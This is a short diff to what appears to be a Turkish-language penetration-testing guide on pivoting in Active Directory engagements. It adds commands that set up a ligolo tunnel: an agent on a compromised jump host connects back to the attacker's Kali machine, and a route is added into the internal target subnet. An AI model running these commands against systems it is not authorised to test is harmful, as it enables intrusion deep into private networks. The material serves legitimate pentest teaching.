@@ -165,5 +165,25 @@ run
 
 ---
 
+$ sudo ip tuntap add user kali mode tun ligolo
+
+$ sudo ip link set ligolo up
+
+@Attack Machine
+./proxy -selfcert -laddr 0.0.0.0:9001
+
+@Jump Host
+agent.exe -connect kali.ip:9001 -ignore-cert
+
+@Attack Machine
+session
+1
+start
+
+sudo ip route add hedef.ip.araligi/24 dev ligolo
+192.168.1.3
+172.16.1.0
+sudo ip tuntap del dev ligolo mode tun
+
 ## Sonuç
 Bu rehber, Active Directory pentestlerinde pivoting safhasında kullanılan tüm komutları ve yöntemleri kapsamaktadır. Her bir yöntem, farklı bir senaryo için uygundur ve hangi yöntemin kullanılacağına, mevcut erişim durumuna göre karar verilmelidir. Rehberi ihtiyaçlarınıza göre genişletebilirsiniz.
